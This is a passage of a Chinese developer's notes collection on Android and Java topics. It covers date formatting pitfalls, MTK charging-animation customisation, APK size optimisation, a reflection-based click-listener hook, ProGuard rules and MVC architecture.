        System.out.println("2019-08-31 to yyyy-MM-dd: " + formatUpperCase.format(strDate));
        formatUpperCase = new SimpleDateFormat("YYYY-MM-dd");
        System.out.println("2019-08-31 to YYYY/MM/dd: " + formatUpperCase.format(strDate));
    }
}

运行结果为：

2019-08-31 to yyyy-MM-dd: 2019-08-31
2019-08-31 to YYYY/MM/dd: 2019-08-31

但是如果我们把日期改成 2019-12-31 再试试呢?结果产生了差异：

2019-12-31 to yyyy-MM-dd: 2019-12-31
2019-12-31 to YYYY-MM-dd: 2020-12-31

那么产生这个问题的原因是什么呢?其实很简单：Y 和 y 实际上代表了不同的含义。
y：year-of-era；正正经经的年；
Y：week-based-year；只要本周跨年，那么这周就算入下一年；也就是 12 月
```

## termux是一款android终端仿真器和Linux环境应用程序

```text
https://termux.com/
https://play.google.com/store/apps/details?id=com.termux
https://f-droid.org/packages/com.termux/
推荐使用F-Droid来安装。
```

## 接口类中的方法和属性不要加任何修饰符号

```text
这一点经常在老司机代码中看见，IDE 会提示没啥用。

// 不友好的定义
public interface Test{

    /**
     * This is method describe!
     **/
    public void testMethod();
}
// 友好的定义
public interface Test{

    /**
     * This is method describe!
     **/
    void testMethod();
}
```

## [Snippet] 单独显示toast

```text
写一个空的activity，通过 bundle 传入要显示的字符串
public class ToastActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Toast.makeText(this, getIntent().getStringExtra("msg"), Toast.LENGTH_SHORT).show();
        finish();
    }
}
```

## 添加System service

```text
https://blog.csdn.net/yong_xu/article/details/80911535
```

## getReadableDatabase 不是以只读方式打开数据库

```text
Android 中 getWritableDatabase() 和 getReadableDatabase() 方法都可以获取到 SQLiteDatabase 实例。

但 getReadableDatabase() 并不是以只读方式打开数据库，而是先执行 getWritableDatabase()，失败的情况下才以只读方式打开数据库。

public synchronized SQLiteDatabase getReadableDatabase() {
    // ...
    try {
        // 执行 getWritableDatabase() , 若出现异常,以只读方式打开数据库
        return getWritableDatabase();
    } catch (SQLiteException e) {
        if (mName == null) throw e;  
    }
    SQLiteDatabase db = null;
    try {
        // ... 
        // 以只读方式打开数据库
        db = SQLiteDatabase.openDatabase(path, mFactory, SQLiteDatabase.OPEN_READONLY);
        // ... 
        mDatabase = db;
        return mDatabase;
    } finally {
        // ... 
    }
}
```

## [Snippet] Java中怎么快速把InputStream转化为String

```text
1.
StringWriter stringWriter = new StringWriter();
IOUtils.copy(inputStream, stringWriter, encoding);
stringWriter.toString();

2.
IOUtils.toString(inputStream, encoding);

3.
String result = CharStreams.toString(new InputStreamReader(inputStream, Charsets.UTF_8));

4.
Scanner s = new Scanner(inputStream).useDelimiter("\\A");
String result = s.hasNext() ? s.next() : "";

5.
String result = new BufferedReader(new InputStreamReader(inputStream)).lines().collect(Collectors.joining("\n"));

6.
String result = new BufferedReader(new InputStreamReader(inputStream)).lines().parallel().collect(Collectors.joining("\n"));
```

## [Snippet] 判断一个数是奇数还是偶数?

```text
public boolean isOdd(int i) {
    return (i & 1) == 1;
}
实际代码测试过，发现上面的按位与操作和取模操作，实际运行的时间是差不多的，为什么呢?
编译器会将对2的指数的取模操作，优化成位运算操作。
```

## android studio memory profiler 的学习和使用??

```text
Java : java代码分配的内存
Native:c/c++代码分配的内存(有时候其实并没有使用到c/c++代码,但还是会有Native的内存分配，因为Android Framework会去通过java代码访问一些需要使用Native的资源，如图像资源Bitmap)
Graphics:图像缓存等，包括GL surfaces, GL textures等.
Stack:栈内存（包括java和c/c++）
Code:代码的内存分配（例如代码，资源，libs等等）
Other:这个是连系统都不知道是什么类型的内存，放在这里.
Allocated: jave分配的对象个数 (在Android7.1和以下的设备，这个计数是在设备连接后开始，所以并不是app启动时候的计数。Android8.0或更高，在系统里面内置的Profiler工具，所以无论什么时候连接，都是app启动时候的计数)

浅层大小(Shallow size)
这是对象自身占用内存的大小。

典型的 JavaScript 对象会将一些内存用于自身的说明和保存中间值。通常，只有数组和字符串会有明显的浅层大小。不过，字符串和外部数组的主存储一般位于渲染器内存中，仅将一个小包装器对象置于 JavaScript 堆上。

渲染器内存是渲染检查页面的进程的内存总和：原生内存 + 页面的 JS 堆内存 + 页面启动的所有专用工作线程的 JS 堆内存。尽管如此，即使一个小对象也可能通过阻止其他对象被自动垃圾回收进程处理的方式间接地占用大量内存。

保留大小(Retained size)
这是将对象本身连同其无法从 GC 根到达的相关对象一起删除后释放的内存大小。

GC 根由句柄组成，这些句柄在从原生代码引用 V8 外部的 JavaScript 对象时创建（本地或全局）。所有此类句柄都可以在 GC 根 > 句柄作用域和 GC 根 > 全局句柄下的堆快照内找到。本文档对句柄的介绍没有深入到浏览器实现的细节，可能让您感到困惑。您不必担心 GC 根和句柄。
```

## Android 8.0系统的应用图标适配

```text
https://www.cnblogs.com/whycxb/p/9738681.html
```

## android内部类导致的内存泄漏实战解析

```text
https://blog.csdn.net/sinat_31057219/article/details/74533647

https://yuanfentiank789.github.io/2016/06/28/%E5%B8%B8%E8%A7%81%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E5%8E%9F%E5%9B%A0%E5%8F%8A%E8%A7%A3%E5%86%B32/

当使用了BraodcastReceiver、Cursor、Bitmap等资源时，当不需要使用时，需要及时释放掉，若没有释放，则会引起内存泄漏。
```

## Android 5.0 源码 USB插拔事件监听

```text
https://blog.csdn.net/qq_27061049/article/details/53639122
```

## MTK Android Q修改关机充电动画

```text
1.关机充电动画的图片
修改 vendor/mediatek/proprietary/bootable/bootloader/lk/dev/logo/fwvgaplus/ 下的图片
具体对应的文件夹可以查看 ProjectConfig.mk 中配置的宏 BOOT_LOGO = fwvgaplus

修改完图片之后只需要 make lk 就可以生效，大大节省了编译时间
source build/envsetup.sh
lunch xxx
make -j16 clean-lk
make -j16 lk
然后用 flashtool 直接 download logo.bin/logo-sign.bin 就可以了

2.关机充电动画的显示代码
vendor/mediatek/proprietary/external/libshowlogo/show_animation_common.c

根据对应的屏幕宽高找到对应的 BC2 代码如下，下面是修改过后的坐标，这个坐标要和UI做好的图片上的坐标相对应

...
else if(lcm_width==480 && lcm_height==960) {
      SLOGD("[show_animation_common: %s %d] Inside 480*960 \n",__FUNCTION__,__LINE__);
      // 电量柱
      charg_anim_ui_dimen.cap_left=189;
      charg_anim_ui_dimen.cap_top=385;
      charg_anim_ui_dimen.cap_right=291;
      charg_anim_ui_dimen.cap_bottom=551;
      // 电量百分比数字
      charg_anim_ui_dimen.num_left=205;
      charg_anim_ui_dimen.num_top=310;
      charg_anim_ui_dimen.num_right=225;
      charg_anim_ui_dimen.num_bottom=338;
      // 百分号
      charg_anim_ui_dimen.percent_left=248;
      charg_anim_ui_dimen.percent_top=310;
      charg_anim_ui_dimen.percent_right=272;
      charg_anim_ui_dimen.percent_bottom=338;
      // 充电动画
      charg_anim_ui_dimen.top_anim_left=189;
      charg_anim_ui_dimen.top_anim_top=100;
      charg_anim_ui_dimen.top_anim_right=291;
      charg_anim_ui_dimen.top_anim_bottom=118;
      // ??
      charg_anim_ui_dimen.bar_left=184;
      charg_anim_ui_dimen.bar_top=227;
      charg_anim_ui_dimen.bar_right=294;
      charg_anim_ui_dimen.bar_bottom=437;
}
...

void fill_animation_battery_new(int capacity, void *fill_addr, void * dec_logo_addr, void * logo_addr, LCM_SCREEN_T phical_screen)
{
    if (MTK_LOG_ENABLE == 1) {
        SLOGD("[show_animation_common: %s %d] capacity : %d\n",__FUNCTION__,__LINE__, capacity);
    }
    if (percent_pic_addr==NULL) {
        percent_pic_addr=(unsigned short*)malloc(((charg_anim_ui_dimen.percent_right - charg_anim_ui_dimen.percent_left)*(charg_anim_ui_dimen.percent_bottom - charg_anim_ui_dimen.percent_top)*4)*sizeof(unsigned short));
        memset(percent_pic_addr,0,(((charg_anim_ui_dimen.percent_right - charg_anim_ui_dimen.percent_left)*(charg_anim_ui_dimen.percent_bottom - charg_anim_ui_dimen.percent_top)*4)*sizeof(unsigned short)));
    }
    if (top_animation_addr==NULL) {
        top_animation_addr=(unsigned short*)malloc(((charg_anim_ui_dimen.top_anim_right - charg_anim_ui_dimen.top_anim_left)*(charg_anim_ui_dimen.top_anim_bottom - charg_anim_ui_dimen.top_anim_top)*4)*sizeof(unsigned short));
        memset(top_animation_addr,0,(((charg_anim_ui_dimen.top_anim_right - charg_anim_ui_dimen.top_anim_left)*(charg_anim_ui_dimen.top_anim_bottom - charg_anim_ui_dimen.top_anim_top)*4)*sizeof(unsigned short)));
    }
    RECT_REGION_T percent_location_rect = {charg_anim_ui_dimen.percent_left,charg_anim_ui_dimen.percent_top,charg_anim_ui_dimen.percent_right,charg_anim_ui_dimen.percent_bottom};

    if (capacity >= 100) {
        //show_logo(37); // battery 100
        fill_animation_logo(FULL_BATTERY_INDEX, fill_addr, dec_logo_addr, logo_addr,phical_screen);

    } else if (capacity < 10) {
        if (MTK_LOG_ENABLE == 1) {
            SLOGD("[show_animation_common: %s %d] charging_low_index = %d\n",__FUNCTION__,__LINE__, charging_low_index);
        }
        charging_low_index ++ ;

        fill_animation_logo(LOW_BAT_ANIM_START_0 + charging_low_index, fill_addr, dec_logo_addr, logo_addr,phical_screen);
        fill_animation_number(NUMBER_PIC_START_0 + capacity, 1, fill_addr, logo_addr, phical_screen);
        fill_animation_dynamic(NUMBER_PIC_PERCENT, percent_location_rect, fill_addr, percent_pic_addr, logo_addr, phical_screen);

        if (charging_low_index >= 9) charging_low_index = 0;

    } else {

        unsigned int capacity_grids = 0;
        //static RECT_REGION_T battery_rect = {CAPACITY_LEFT,CAPACITY_TOP,CAPACITY_RIGHT,CAPACITY_BOTTOM};
        capacity_grids = charg_anim_ui_dimen.cap_bottom - (charg_anim_ui_dimen.cap_bottom - charg_anim_ui_dimen.cap_top) * (capacity - 10) / 90; 
        if (MTK_LOG_ENABLE == 1) {
            SLOGD("[show_animation_common: %s %d] capacity_grids : %d,charging_animation_index = %d\n"
                     ,__FUNCTION__,__LINE__, capacity_grids,charging_animation_index);
        }

        //background
        fill_animation_logo(ANIM_V1_BACKGROUND_INDEX, fill_addr, dec_logo_addr, logo_addr,phical_screen);

        fill_animation_line(ANIM_LINE_INDEX, capacity_grids, fill_addr,  logo_addr, phical_screen);
        fill_animation_number(NUMBER_PIC_START_0 + (capacity/10), 0, fill_addr, logo_addr, phical_screen);
        fill_animation_number(NUMBER_PIC_START_0 + (capacity%10), 1, fill_addr, logo_addr, phical_screen);
        fill_animation_dynamic(NUMBER_PIC_PERCENT, percent_location_rect, fill_addr, percent_pic_addr, logo_addr, phical_screen);

         if (capacity <= 90)
         {
            RECT_REGION_T top_animation_rect = {charg_anim_ui_dimen.top_anim_left, capacity_grids - (charg_anim_ui_dimen.top_anim_bottom - charg_anim_ui_dimen.top_anim_top), charg_anim_ui_dimen.top_anim_right, capacity_grids};
            //top_animation_rect.bottom = capacity_grids;
            //top_animation_rect.top = capacity_grids - top_animation_height;
            charging_animation_index++;
            //show_animation_dynamic(15 + charging_animation_index, top_animation_rect, top_animation_addr);
            fill_animation_dynamic(BAT_ANIM_START_0 + charging_animation_index, top_animation_rect, fill_addr,
                            top_animation_addr, logo_addr, phical_screen);

            if (charging_animation_index >= 9) charging_animation_index = 0;
         }
    }
}

修改上述代码之后模块编译 push libshowlogo 模块之后 reboot 即可生效，下面是用ninja来模块编译，非常快速，几乎秒编，大大提高编译效率
prebuilts/build-tools/linux-x86/bin/ninja -f out/combined-full_k80hd_bsp_fwv_512m.ninja libshowlogo 2>&1 | tee logo.log
adb push out/target/product/k80hd_bsp_fwv_512m/system/lib/libshowlogo.so /system/lib/

3.关机充电动画测试代码
vendor/mediatek/proprietary/external/libshowlogo/libshowlogoTest/animation_test.c
// 修改后的测试代码如下，意思是测试从100%的电量开始每次减少1%的电量，观察效果即可，这样就不需要每次充放电来测试，可以大大提高调试效率
void test_charging_animation(int charging_item)
{
    int capacity=100;
    while(capacity >= 0) {
        if (charging_item == 2) {
            show_fast_charging(capacity);
        } else {
            show_battery_capacity(capacity);
        }
        capacity--;
        sleep(1);
    }
}

修改之后模块编译+push
./mk -ud VP592_BC2_OPEN mm vendor/mediatek/proprietary/external/libshowlogo/libshowlogoTest/
adb push out/target/product/k80hd_bsp_fwv_512m/system/bin/libshowlogotest /system/bin/

libshowlogotest 的使用方法
adb shell libshowlogotest charging sf new

libshowlogotest 的详细使用方法如下
printf("[logo_test %s %d] libshowlogo Test ...\n",__FUNCTION__,__LINE__);
printf("***************     libshowlogo Test       ********************\n");
printf("*******     Testlibshowlogo  introduce...               *******\n");
printf("It can test boot logo, kernel logo and charging animation using \n framebuffer or surface flinger with different parameters\n"); 
printf("***************************************************************\n");
printf(" ---> para 1:boot kernel charging ut\n");
printf("    boot: boot logo\n");
printf("    kernel: kernel logo \n");
printf("    charging: charging animation\n");
printf("    ut: test all\n");
printf(" ---> para 2: fb sf \n");
printf("    fb: framebuffer\n");
printf("    sf: surface flinger\n");
printf(" ---> para 3: new fast wireless \n");
printf("    new: new version\n");
printf("    fast: fast Charging\n");
printf("    wireless: wireless Charging\n");
printf("\n ---> Example (Default):libshowlogoTest boot  sf\n");
printf("**************************************************************\n");

参考资料：
https://blog.csdn.net/yangfan1571397878/article/details/95636067        Android P修改关机充电动画

下面这种方式还验证是否可行??
mmm -B vendor/mediatek/proprietary/bootable/bootloader/preloader:pl -j16
mmm -B vendor/mediatek/proprietary/bootable/bootloader/lk:lk -j16

关机充电log可能需要抓UART串口log

关机充电流程
https://www.itread01.com/p/148275.html
```

## [Snippet] inset 插图的学习

```text
<?xml version="1.0" encoding="utf-8"?>
<inset xmlns:android="http://schemas.android.com/apk/res/android"
    android:insetLeft="2.5dp"
    android:insetRight="2.5dp"
    android:drawable="@*android:drawable/ic_qs_dnd" />
```

## [Snippet] svg2xml的代码研究

```text
// Based on
// https://github.com/JFXtras/jfxtras-labs/blob/2.2/src/main/java/jfxtras/labs/util/ShapeConverter.java
SVG-Android 的开源项目中有更好的实现

var ShapeConverter = new function () {
    var KAPPA = 0.5522847498307935;

    function s(number) {
        return (parseFloat(number.toPrecision(12)));
    }

    this.convertLine = function (lineTag) {
        var x1 = lineTag.attr("x1");
        var x2 = lineTag.attr("x2");
        var y1 = lineTag.attr("y1");
        var y2 = lineTag.attr("y2");

        return "M " + x1 + " " + y1 + " " + "L " + x2 + " " + y2;
    };

    this.convertRect = function (rectTag) {
        var x = parseFloat(rectTag.attr("x") || 0);
        var y = parseFloat(rectTag.attr("y") || 0);
        var w = parseFloat(rectTag.attr("width") || 0);
        var h = parseFloat(rectTag.attr("height") || 0);
        var rx = parseFloat(rectTag.attr("rx") || 0);
        var ry = parseFloat(rectTag.attr("ry") || 0);
        var r = s(x + w);
        var b = s(y + h);

        if (ry == 0) {
            ry = rx;
        } else if (rx == 0) {
            rx = ry;
        }

        if (rx == 0 && ry == 0) {
            return "M " + x + " " + y + " H " + s(x+w) + " V " + s(y+h) + " H " + x + " V " + y + " Z";
        } else {
            return "M " + s(x + rx) + " " + y + " "
                + "L " + s(r - rx) + " " + y + " "
                + "Q " + r + " " + y + " " + r + " " + s(y + ry) + " "
                + "L " + r + " " + s(y + h - ry) + " "
                + "Q " + r + " " + b + " " + s(r - rx) + " " + b + " "
                + "L " + s(x + rx) + " " + b + " "
                + "Q " + x + " " + b + " " + x + " " + s(b - ry) + " "
                + "L " + x + " " + s(y + ry) + " "
                + "Q " + x + " " + y + " " + s(x + rx) + " " + y + " "
                + "Z";
        }
    };

    this.convertCircle = function (circleTag) {
        var cx = parseFloat(circleTag.attr("cx") || 0);
        var cy = parseFloat(circleTag.attr("cy") || 0);
        var r = parseFloat(circleTag.attr("r") || 0);
        var controlDistance = r * KAPPA;

        // Move to first point
        var output = "M " + cx + " " + s(cy - r) + " ";
        // 1. quadrant
        output += "C " + s(cx + controlDistance) + " " + s(cy - r) + " " + s(cx + r) +
        " " + s(cy - controlDistance) + " " + s(cx + r) + " " + cy + " ";
        // 2. quadrant
        output += "C " + s(cx + r) + " " + s(cy + controlDistance) + " " + s(cx + controlDistance) +
        " " + s(cy + r) + " " + cx + " " + s(cy + r) + " ";
        // 3. quadrant
        output += "C " + s(cx - controlDistance) + " " + s(cy + r) + " " + s(cx - r) + " " +
        s(cy + controlDistance) + " " + s(cx - r) + " " + cy + " ";
        // 4. quadrant
        output += "C " + s(cx - r) + " " + s(cy - controlDistance) + " " + s(cx - controlDistance) + " " + s(cy - r) +
        " " + cx + " " + s(cy - r) + " ";
        // Close path
        output += "Z";

        return output;
    };

    this.convertEllipse = function (ellipseTag) {
        var cx = parseFloat(ellipseTag.attr("cx") || 0);
        var cy = parseFloat(ellipseTag.attr("cy") || 0);
        var rx = parseFloat(ellipseTag.attr("rx") || 0);
        var ry = parseFloat(ellipseTag.attr("ry") || 0);
        var controlDistanceX = rx * KAPPA;
        var controlDistanceY = ry * KAPPA;

        // Move to first point
        var output = "M " + cx + " " + s(cy - ry) + " ";
        // 1. quadrant
        output += "C " + s(cx + controlDistanceX) + " " + s(cy - ry) + " "
        + s(cx + rx) + " " + s(cy - controlDistanceY) + " " + s(cx + rx) + " " + cy + " ";
        // 2. quadrant
        output += "C " + s(cx + rx) + " " + s(cy + controlDistanceY) + " "
        + s(cx + controlDistanceX) + " " + s(cy + ry) + " "  + cx + " " + s(cy + ry) + " ";
        // 3. quadrant
        output += "C " + s(cx - controlDistanceX) + " " + s(cy + ry) + " "
        + s(cx - rx) + " " + s(cy + controlDistanceY) + " " + s(cx - rx) + " " + cy + " ";
        // 4. quadrant
        output += "C " + s(cx - rx) + " " + s(cy - controlDistanceY) + " "
        + s(cx - controlDistanceX) + " " + s(cy - ry) + " " + cx + " " + s(cy - ry) + " ";
        // Close path
        output += "Z";
        return output;
    };

    this.convertPolygon = function (polylineTag, isPolyline) {
        var points = polylineTag.attr("points");
        var pointsArrayRaw = typeof points !== "undefined" ? points.split(",") : [] ;
        var pointsArray = [] ;
        for (var i = 0; i < pointsArrayRaw.length; i++) {
            var splitted = pointsArrayRaw[i] .split(" ");
            for (var j = 0; j < splitted.length; j++) {
                if (splitted[j] .length > 0) {
                    pointsArray.push(splitted[j] );
                }
            }
        }

        if (pointsArray.length % 2 == 0) {
            var output = "";
            for (var i = 0 ; i < pointsArray.length ; i += 2) {
                output += (i == 0 ? "M " : "L ");
                output += pointsArray[i]  + " "+ pointsArray[i+1]  + " ";
            }
            if (!isPolyline) {
                output += "Z";
            }
            return output;
        } else {
            return null;
        }
    };
};
```

## Apk 包体优化

## Apk 组成结构

| 文件/文件夹 | 作用/功能
|--|--
| res | 包含所有没有被编译到 .arsc 里面的资源文件
| lib | 引用库的文件夹
| assets | assets文件夹相比于 res 文件夹，还有可能放字体文件、预置数据和web页面等,通过 AssetManager 访问
| META_INF | 存放的是签名信息，用来保证 apk 包的完整性和系统的安全。在生成一个APK的时候，会对所有的打包文件做一个校验计算，并把结果放在该目录下面
| classes.dex | 包含编译后的应用程序源码转化成的dex字节码。APK 里面，可能会存在多个 dex 文件
| resources.arsc | 一些资源和标识符被编译和写入这个文件
| Androidmanifest.xml | 编译时，应用程序的 AndroidManifest.xml 被转化成二进制格式

## 整体优化

- 分离应用的独立模块，以插件的形式加载
- 解压APK，重新用 7zip 进行压缩
- 用 apksigner 签名工具 替代 java 提供的 jarsigner 签名工具

## 资源优化

- 可以只用一套资源图片，一般采用 xhdpi 下的资源图片
- 通过扫描文件的 MD5 值，找出名字不同，内容相同的图片并删除
- 通过 Lint 工具扫描工程资源，移除无用资源
- 通过 Gradle 参数配置 shrinkResources=true
- 对 png 图片压缩
- 图片资源考虑采用 WebP 格式
- 避免使用帧动画，可使用 Lottie 动画库
- 优先考虑能否用 shape 代码、.9 图、svg 矢量图、VectorDrawable 类来替换传统的图片

## 代码优化

- 启用混淆以移除无用代码
- 剔除 R 文件
- 用注解替代枚举

## .arsc文件优化

- 移除未使用的备用资源来优化 .arsc 文件

```groovy
android {
    defaultConfig {
        ...
        resConfigs "zh", "zh_CN", "zh_HK", "en"
    }
}
```

## lib目录优化

- 只提供对主流架构的支持，比如 arm，对于 mips 和 x86 架构可以考虑不提供支持

```groovy

android {
    defaultConfig {
        ...
        ndk {
            abiFilters  "armeabi-v7a"
        }
    }
}
```

## Hook

## 基本流程

1、根据需求确定 要 hook 的对象
2、寻找要hook的对象的持有者，拿到要 hook 的对象
3、定义“要 hook 的对象”的代理类，并且创建该类的对象
4、使用上一步创建出来的对象，替换掉要 hook 的对象

## 使用示例

```java
/**
* hook的核心代码
* 这个方法的唯一目的：用自己的点击事件，替换掉 View 原来的点击事件
*
* @param view hook的范围仅限于这个view
*/
@SuppressLint({"DiscouragedPrivateApi", "PrivateApi"})
public static void hook(Context context, final View view) {//
    try {
        // 反射执行View类的getListenerInfo()方法，拿到v的mListenerInfo对象，这个对象就是点击事件的持有者
        Method method = View.class.getDeclaredMethod("getListenerInfo");
        method.setAccessible(true);//由于getListenerInfo()方法并不是public的，所以要加这个代码来保证访问权限
        Object mListenerInfo = method.invoke(view);//这里拿到的就是mListenerInfo对象，也就是点击事件的持有者

        // 要从这里面拿到当前的点击事件对象
        Class<?> listenerInfoClz = Class.forName("android.view.View$ListenerInfo");// 这是内部类的表示方法
        Field field = listenerInfoClz.getDeclaredField("mOnClickListener");
        final View.OnClickListener onClickListenerInstance = (View.OnClickListener) field.get(mListenerInfo);//取得真实的mOnClickListener对象

        // 2. 创建我们自己的点击事件代理类
        //   方式1：自己创建代理类
        //   ProxyOnClickListener proxyOnClickListener = new ProxyOnClickListener(onClickListenerInstance);
        //   方式2：由于View.OnClickListener是一个接口，所以可以直接用动态代理模式
        // Proxy.newProxyInstance的3个参数依次分别是：
        // 本地的类加载器;
        // 代理类的对象所继承的接口（用Class数组表示，支持多个接口）
        // 代理类的实际逻辑，封装在new出来的InvocationHandler内
        Object proxyOnClickListener = Proxy.newProxyInstance(context.getClass().getClassLoader(), new Class[] {View.OnClickListener.class}, new InvocationHandler() {
            @Override
            public Object invoke(Object proxy, Method method, Object[]  args) throws Throwable {
                Log.d("HookSetOnClickListener", "点击事件被hook到了");//加入自己的逻辑
                return method.invoke(onClickListenerInstance, args);//执行被代理的对象的逻辑
            }
        });
        // 3. 用我们自己的点击事件代理类，设置到"持有者"中
        field.set(mListenerInfo, proxyOnClickListener);
    } catch (Exception e) {
        e.printStackTrace();
    }
}

// 自定义代理类
static class ProxyOnClickListener implements View.OnClickListener {
    View.OnClickListener oriLis;

    public ProxyOnClickListener(View.OnClickListener oriLis) {
        this.oriLis = oriLis;
    }

    @Override
    public void onClick(View v) {
        Log.d("HookSetOnClickListener", "点击事件被hook到了");
        if (oriLis != null) {
            oriLis.onClick(v);
        }
    }
}
```

## Proguard

Proguard 具有以下三个功能：

- 压缩（Shrink）: 检测和删除没有使用的类，字段，方法和特性
- 优化（Optimize） : 分析和优化Java字节码
- 混淆（Obfuscate）: 使用简短的无意义的名称，对类，字段和方法进行重命名

## 公共模板

```text
#############################################
#
# 对于一些基本指令的添加
#
#############################################
# 代码混淆压缩比，在 0~7 之间，默认为 5，一般不做修改
-optimizationpasses 5

# 混合时不使用大小写混合，混合后的类名为小写
-dontusemixedcaseclassnames

# 指定不去忽略非公共库的类
-dontskipnonpubliclibraryclasses

# 这句话能够使我们的项目混淆后产生映射文件
# 包含有类名->混淆后类名的映射关系
-verbose

# 指定不去忽略非公共库的类成员
-dontskipnonpubliclibraryclassmembers

# 不做预校验，preverify 是 proguard 的四个步骤之一，Android 不需要 preverify，去掉这一步能够加快混淆速度。
-dontpreverify

# 保留 Annotation 不混淆
-keepattributes *Annotation*,InnerClasses

# 避免混淆泛型
-keepattributes Signature

# 抛出异常时保留代码行号
-keepattributes SourceFile,LineNumberTable

# 指定混淆是采用的算法，后面的参数是一个过滤器
# 这个过滤器是谷歌推荐的算法，一般不做更改
-optimizations !code/simplification/cast,!field/*,!class/merging/*


#############################################
#
# Android开发中一些需要保留的公共部分
#
#############################################

# 保留我们使用的四大组件，自定义的 Application 等等这些类不被混淆
# 因为这些子类都有可能被外部调用
-keep public class * extends android.app.Activity
-keep public class * extends android.app.Appliction
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider
-keep public class * extends android.app.backup.BackupAgentHelper
-keep public class * extends android.preference.Preference
-keep public class * extends android.view.View
-keep public class com.android.vending.licensing.ILicensingService


# 保留 support 下的所有类及其内部类
-keep class android.support.** { *; }

# 保留继承的
-keep public class * extends android.support.v4.**
-keep public class * extends android.support.v7.**
-keep public class * extends android.support.annotation.**

# 保留 R 下面的资源
-keep class **.R$* { *; }

# 保留本地 native 方法不被混淆
-keepclasseswithmembernames class * {
    native <methods>;
}

# 保留在 Activity 中的方法参数是view的方法，
# 这样以来我们在 layout 中写的 onClick 就不会被影响
-keepclassmembers class * extends android.app.Activity {
    public void *(android.view.View);
}

# 保留枚举类不被混淆
-keepclassmembers enum * {
    public static **[]  values();
    public static ** valueOf(java.lang.String);
}

# 保留我们自定义控件（继承自 View）不被混淆
-keep public class * extends android.view.View {
    *** get*();
    void set*(***);
    public <init>(android.content.Context);
    public <init>(android.content.Context, android.util.AttributeSet);
    public <init>(android.content.Context, android.util.AttributeSet, int);
}

# 保留 Parcelable 序列化类不被混淆
-keep class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator *;
}

# 保留 Serializable 序列化的类不被混淆
-keepnames class * implements java.io.Serializable
-keepclassmembers class * implements java.io.Serializable {
    static final long serialVersionUID;
    private static final java.io.ObjectStreamField[]  serialPersistentFields;
    !static !transient <fields>;
    !private <fields>;
    !private <methods>;
    private void writeObject(java.io.ObjectOutputStream);
    private void readObject(java.io.ObjectInputStream);
    java.lang.Object writeReplace();
    java.lang.Object readResolve();
}

# 对于带有回调函数的 onXXEvent、**On*Listener 的，不能被混淆
-keepclassmembers class * {
    void *(**On*Event);
    void *(**On*Listener);
}

# webView 处理，项目中没有使用到 webView 忽略即可
-keepclassmembers class fqcn.of.javascript.interface.for.webview {
    public *;
}
-keepclassmembers class * extends android.webkit.webViewClient {
    public void *(android.webkit.WebView, java.lang.String, android.graphics.Bitmap);
    public boolean *(android.webkit.WebView, java.lang.String);
}
-keepclassmembers class * extends android.webkit.webViewClient {
    public void *(android.webkit.webView, java.lang.String);
}

# js
-keepattributes JavascriptInterface
-keep class android.webkit.JavascriptInterface { *; }
-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}

# @Keep
-keep,allowobfuscation @interface android.support.annotation.Keep
-keep @android.support.annotation.Keep class *
-keepclassmembers class * {
    @android.support.annotation.Keep *;
}
```

## 常用的自定义混淆规则

```textxml
# 通配符*，匹配任意长度字符，但不含包名分隔符(.)
# 通配符**，匹配任意长度字符，并且包含包名分隔符(.)

# 不混淆某个类
-keep public class com.jasonwu.demo.Test { *; }

# 不混淆某个包所有的类
-keep class com.jasonwu.demo.test.** { *; }

# 不混淆某个类的子类
-keep public class * com.jasonwu.demo.Test { *; }

# 不混淆所有类名中包含了 ``model`` 的类及其成员
-keep public class **.*model*.** {*;}

# 不混淆某个接口的实现
-keep class * implements com.jasonwu.demo.TestInterface { *; }

# 不混淆某个类的构造方法
-keepclassmembers class com.jasonwu.demo.Test { 
  public <init>(); 
}

# 不混淆某个类的特定的方法
-keepclassmembers class com.jasonwu.demo.Test { 
  public void test(java.lang.String); 
}
```

## aar中增加独立的混淆配置

``build.gralde``

```textgradle
android {
    ···
    defaultConfig {
        ···
        consumerProguardFile 'proguard-rules.pro'
    }
    ···
}
```

## 检查混淆和追踪异常

开启 Proguard 功能，则每次构建时 ProGuard 都会输出下列文件：

- dump.txt
说明 APK 中所有类文件的内部结构。

- mapping.txt
提供原始与混淆过的类、方法和字段名称之间的转换。

- seeds.txt
列出未进行混淆的类和成员。

- usage.txt
列出从 APK 移除的代码。

这些文件保存在 /build/outputs/mapping/release/ 中。我们可以查看 seeds.txt 里面是否是我们需要保留的，以及 usage.txt 里查看是否有误删除的代码。 mapping.txt 文件很重要，由于我们的部分代码是经过重命名的，如果该部分出现 bug，对应的异常堆栈信息里的类或成员也是经过重命名的，难以定位问题。我们可以用 retrace 脚本（在 Windows 上为 retrace.bat；在 Mac/Linux 上为 retrace.sh）。它位于 /tools/proguard/ 目录中。该脚本利用 mapping.txt 文件和你的异常堆栈文件生成没有经过混淆的异常堆栈文件,这样就可以看清是哪里出问题了。使用 retrace 工具的语法如下：

```textshell
retrace.bat|retrace.sh [-verbose]  mapping.txt [<stacktrace_file>] 
```

## 架构

## MVC

![] (<https://mmbiz.qpic.cn/mmbiz_png/zKFJDM5V3Wy5xbLTp6JMMdouZiavFxyYCwLhGyLdicyLzgUDKFTZVt1OgU6iaSx2IUwnygzmQzW7Renaa8hmQ62cQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1>)

在 Android 中，三者的关系如下：

![] (<https://mmbiz.qpic.cn/mmbiz_png/zKFJDM5V3Wy5xbLTp6JMMdouZiavFxyYCicNvEVMO9vDgukUR29Z1DCacZJwmmH1EEb7gUOZmDxolWexP01O8jfg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1>)

由于在 Android 中 xml 布局的功能性太弱，所以 Activity 承担了绝大部分的工作，所以在 Android 中 mvc 更像：

![] (<https://mmbiz.qpic.cn/mmbiz_png/zKFJDM5V3Wy5xbLTp6JMMdouZiavFxyYCOq89MLQX4UM3dgBTQfU72desHb1XbOWRQZINnXOCCdZCuicUiaTHhtEg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1>)

总结：

- 具有一定的分层，model 解耦，controller 和 view 并没有解耦
- controller 和 view 在 Android 中无法做到彻底分离，Controller 变得臃肿不堪
